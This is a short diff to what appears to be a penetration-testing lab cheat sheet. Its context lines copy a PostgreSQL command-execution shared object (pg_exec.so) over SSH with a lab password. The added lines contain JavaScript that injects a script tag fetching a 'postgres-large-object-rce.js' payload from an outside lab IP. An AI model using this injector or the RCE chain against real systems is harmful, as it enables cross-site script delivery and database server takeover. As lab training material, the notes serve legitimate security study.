@@ -222,3 +222,23 @@ grabbing the newly created so
 ```bash
 sshpass -p studentlab scp student@answers:~/temp/pg_exec.so .
 ```
+
+injecting a script
+```js
+function injectScript(src) {
+    return new Promise((resolve, reject) => {
+        const script = document.createElement('script');
+        script.src = src;
+        script.addEventListener('load', resolve);
+        script.addEventListener('error', e => reject(e.error));
+        document.head.appendChild(script);
+    });
+}
+
+injectScript('http://192.168.119.123/postgres-large-object-rce.js')
+    .then(() => {
+        console.log('Script loaded!');
+    }).catch(error => {
+        console.error(error);
+    });
+```
